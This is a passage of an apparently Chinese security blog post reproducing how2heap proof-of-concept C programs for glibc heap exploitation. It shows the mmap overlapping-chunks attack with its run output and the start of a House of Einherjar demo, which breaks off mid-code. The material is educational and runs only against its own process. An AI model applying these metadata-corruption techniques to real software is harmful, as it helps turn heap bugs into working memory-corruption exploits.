class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Technique should work on all versions of GLibC</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">POC written by POC written by Maxwell Dulin (Strikeout) </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	A primer on Mmap chunks in GLibC</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	==================================</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	In GLibC, there is a point where an allocation is so large that malloc</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	decides that we need a seperate section of memory for it, instead </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	of allocating it on the normal heap. This is determined by the mmap_threshold var.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	Instead of the normal logic for getting a chunk, the system call *Mmap* is </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	used. This allocates a section of virtual memory and gives it back to the user. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	Similarly, the freeing process is going to be different. Instead </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	of a free chunk being given back to a bin or to the rest of the heap,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	another syscall is used: *Munmap*. This takes in a pointer of a previously </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	allocated Mmap chunk and releases it back to the kernel. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	Mmap chunks have special bit set on the size metadata: the second bit. If this </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	bit is set, then the chunk was allocated as an Mmap chunk. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	Mmap chunks have a prev_size and a size. The *size* represents the current </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	size of the chunk. The *prev_size* of a chunk represents the left over space</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	from the size of the Mmap chunk (not the chunks directly belows size). </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	However, the fd and bk pointers are not used, as Mmap chunks do not go back </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	the chunk must be page-aligned.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	The POC below is essentially an overlapping chunk attack but on mmap chunks. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	This is very similar to https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	The main difference is that mmapped chunks have special properties and are </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	handled in different ways, creating different attack scenarios than normal </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	overlapping chunk attacks. There are other things that can be done, </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	such as munmapping system libraries, the heap itself and other things.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	This is meant to be a simple proof of concept to demonstrate the general </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	way to perform an attack on an mmap chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	For more information on mmap chunks in GLibC, read this post: </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	http://tukan.farm/2016/07/27/munmap-madness/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	*/</span><br><br><br><br>	<span class="hljs-type">int</span>* ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Extremely large chunks are special because they are allocated in their own mmaped section\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;of memory, instead of being put onto the normal heap.\n&quot;</span>);<br><br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;=======================================================\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating three extremely large heap chunks of size 0x100000 \n\n&quot;</span>);<br><br>		<br><br>	<span class="hljs-type">long</span> <span class="hljs-type">long</span>* top_ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);<br><br><br><br>	<span class="hljs-comment">// After this, all chunks are allocated downwards in memory towards the heap.</span><br><br>	<span class="hljs-type">long</span> <span class="hljs-type">long</span>* mmap_chunk_2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);<br><br><br><br>	<span class="hljs-type">long</span> <span class="hljs-type">long</span>* mmap_chunk_3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nCurrent System Memory Layout \n&quot;</span> \<br><br><span class="hljs-string">&quot;================================================\n&quot;</span> \<br><br><span class="hljs-string">&quot;running program\n&quot;</span> \<br><br><span class="hljs-string">&quot;heap\n&quot;</span> \<br><br><span class="hljs-string">&quot;....\n&quot;</span> \<br><br><span class="hljs-string">&quot;third mmap chunk\n&quot;</span> \<br><br><span class="hljs-string">&quot;second mmap chunk\n&quot;</span> \<br><br><span class="hljs-string">&quot;LibC\n&quot;</span> \<br><br><span class="hljs-string">&quot;....\n&quot;</span> \<br><br><span class="hljs-string">&quot;ld\n&quot;</span> \<br><br><span class="hljs-string">&quot;first mmap chunk\n&quot;</span><br><br><span class="hljs-string">&quot;===============================================\n\n&quot;</span> \<br><br>);<br><br>	<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Prev Size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-2</span>]);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size of third mmap chunk: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-1</span>]);<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Change the size of the third mmap chunk to overlap with the second mmap chunk\n&quot;</span>);	<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This will cause both chunks to be Munmapped and given back to the system\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n&quot;</span>);<br><br><br><br>	<span class="hljs-comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span><br><br>	<span class="hljs-comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span><br><br>	mmap_chunk_3[<span class="hljs-number">-1</span>] = (<span class="hljs-number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="hljs-number">-1</span>]) + (<span class="hljs-number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="hljs-number">-1</span>]) | <span class="hljs-number">2</span>;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-1</span>]);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);<br><br><br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	This next call to free is actually just going to call munmap on the pointer we are passing it.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	The source code for this can be found at https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	With normal frees the data is still writable and readable (which creates a use after free on </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	the chunk). However, when a chunk is munmapped, the memory is given back to the kernel. If this</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	data is read or written to, the program crashes.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	Because of this added restriction, the main goal is to get the memory back from the system</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	to have two pointers assigned to the same location.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	*/</span><br><br>	<span class="hljs-comment">// Munmaps both the second and third pointers</span><br><br>	<span class="hljs-built_in">free</span>(mmap_chunk_3); <br><br><br><br>	<span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	Would crash, if on the following:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	mmap_chunk_2[0] = 0xdeadbeef;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	This is because the memory would not be allocated to the current program.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	*/</span><br><br><br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	Allocate a very large chunk with malloc. This needs to be larger than </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	the previously freed chunk because the mmapthreshold has increased to 0x202000.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	If the allocation is not larger than the size of the largest freed mmap </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	chunk then the allocation will happen in the normal section of heap memory.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	*/</span>	<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);<br><br>	<span class="hljs-type">long</span> <span class="hljs-type">long</span>* overlapping_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300000</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="hljs-number">-1</span>]);<br><br><br><br>	<span class="hljs-comment">// Gets the distance between the two pointers.</span><br><br>	<span class="hljs-type">int</span> distance = mmap_chunk_2 - overlapping_chunk;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n&quot;</span>, distance);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Value of index 0 of mmap chunk 2 prior to write: %llx\n&quot;</span>, mmap_chunk_2[<span class="hljs-number">0</span>]);<br><br>	<br><br>	<span class="hljs-comment">// Set the value of the overlapped chunk.</span><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Setting the value of the overlapped chunk\n&quot;</span>);<br><br>	overlapping_chunk[distance] = <span class="hljs-number">0x1122334455667788</span>;<br><br><br><br>	<span class="hljs-comment">// Show that the pointer has been written to.</span><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="hljs-number">0</span>]);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);<br><br>	assert(mmap_chunk_2[<span class="hljs-number">0</span>] == overlapping_chunk[distance]);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/overlapping$ ./mmap_overlapping_chunks<br>This is performing an overlapping chunk attack but on extremely large <span class="hljs-title function_">chunks</span> <span class="hljs-params">(mmap chunks)</span>.<br>Extremely large chunks are special because they are allocated in their own mmaped section<br>of memory, instead of being put onto the normal heap.<br>=======================================================<br><br>Allocating three extremely large heap chunks of size <span class="hljs-number">0x100000</span> <br><br>The first mmap chunk goes directly above LibC: <span class="hljs-number">0x7fd91827c010</span><br>The second mmap chunk goes below LibC: <span class="hljs-number">0x7fd917ca7010</span><br>The third mmap chunk goes below the second mmap chunk: <span class="hljs-number">0x7fd917ba6010</span><br><br>Current System Memory Layout <br>================================================<br>running program<br>heap<br>....<br>third mmap chunk<br>second mmap chunk<br>LibC<br>....<br>ld<br>first mmap chunk<br>===============================================<br><br>Prev Size of third mmap chunk: <span class="hljs-number">0x0</span><br>Size of third mmap chunk: <span class="hljs-number">0x101002</span><br><br>Change the size of the third mmap chunk to overlap with the second mmap chunk<br>This will cause both chunks to be Munmapped and given back to the system<br>This is where the vulnerability occurs; corrupting the size or prev_size of a chunk<br>New size of third mmap chunk: <span class="hljs-number">0x202002</span><br>Free the third mmap chunk, which munmaps the second and third chunks<br><br>Get a very large chunk from <span class="hljs-built_in">malloc</span> to get mmapped chunk<br>This should overlap over the previously munmapped/freed chunks<br>Overlapped chunk Ptr: <span class="hljs-number">0x7fd917aa7010</span><br>Overlapped chunk Ptr Size: <span class="hljs-number">0x301002</span><br>Distance between new chunk and the second mmap <span class="hljs-title function_">chunk</span> <span class="hljs-params">(which was munmapped)</span>: 0x40000<br>Value of index 0 of mmap chunk 2 prior to write: 0<br>Setting the value of the overlapped chunk<br>Second chunk <span class="hljs-title function_">value</span> <span class="hljs-params">(after write)</span>: 0x1122334455667788<br>Overlapped chunk value: 0x1122334455667788<br><br>Boom! The new chunk has been overlapped with a previous mmaped chunk<br></code></pre></td></tr></table></figure>



<h2 id="House"><a href="#House" class="headerlink" title="House"></a>House</h2><h3 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h3><p>我们在任意地址伪造一个free_chunk，并且设置堆中chunk的<code>pre_size</code>使堆管理器能够找到栈中伪造的chunk，当我们释放时，就会找到fake_chunk进行合并，下一次分配就会在我们想要的位置。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Credit to st4g3r for publishing this technique</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>	setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br><br>	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to House of Einherjar!\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br><br><br>	<span class="hljs-type">uint8_t</span>* a;<br><br>	<span class="hljs-type">uint8_t</span>* b;<br><br>	<span class="hljs-type">uint8_t</span>* d;<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);<br><br>	a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><br>	<br><br>	<span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);<br><br><br><br>	<span class="hljs-comment">// create a fake chunk</span><br><span class="hljs-comment">// 我们可以在任意位置设置我们的fake_chunk</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);<br><span class="hljs-comment">// 我们设置fake_chunk的fd和bk都指向其本身，以便我们能够绕过unlink</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);<br><br><br><span class="hljs-comment">// 构造fake_chunk</span><br>	<span class="hljs-type">size_t</span> fake_chunk[<span class="hljs-number">6</span>];<br><br><br><span class="hljs-comment">// 绕过检查</span><br>	fake_chunk[<span class="hljs-number">0</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span><br><span class="hljs-comment">// 需要在smallbin的范围之内</span><br>	fake_chunk[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// size of the chunk just needs to be small enough to stay in the small bin</span><br><br>	fake_chunk[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// fwd</span><br><br>	fake_chunk[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// bck</span><br><br>	fake_chunk[<span class="hljs-number">4</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//fwd_nextsize</span><br><br>	fake_chunk[<span class="hljs-number">5</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//bck_nextsize</span><br><br><br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">0</span>]);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span 